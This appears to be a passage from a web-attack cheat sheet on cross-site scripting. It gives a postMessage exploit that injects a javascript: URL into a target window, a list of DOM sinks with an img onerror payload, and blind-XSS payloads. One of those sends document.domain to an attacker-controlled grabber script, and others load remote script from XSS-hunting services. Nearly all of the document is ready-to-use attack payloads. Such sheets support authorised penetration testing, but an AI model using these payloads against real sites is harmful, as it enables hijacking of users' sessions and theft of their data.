```

### XSS in PostMessage

**Exploit if target origin is asterisk (*):**
```html
<script>
window.poc = window.open('http://{TARGET_URL}/#login');
setTimeout(function(){
    window.poc.postMessage({
        "sender": "accounts",
        "url": "javascript:{PAYLOAD}",
    }, '*');
}, 2000);
</script>
```

### DOM-Based XSS

**Common Sinks:**
```javascript
document.write()
document.writeln()
innerHTML
outerHTML
insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location
location.href
location.search
location.hash
```

**Example:**
```html
#"><img src=/ onerror=alert(2)>
```

### Blind XSS

**Common Endpoints:**
- Contact forms
- Ticket support systems
- Referer Header (Admin logs)
- User Agent (Admin logs)
- Comment boxes (Admin panels)

**Payload:**
```html
<script>document.location='http://{ATTACKER_URL}:{PORT}/XSS/grabber.php?c='+document.domain</script>
"><script src="https://{BLIND_XSS_SERVICE}/{CUSTOM_NAME}"></script>
"><script src=//{BLIND_XSS_SUBDOMAIN}.xss.ht></script>
```

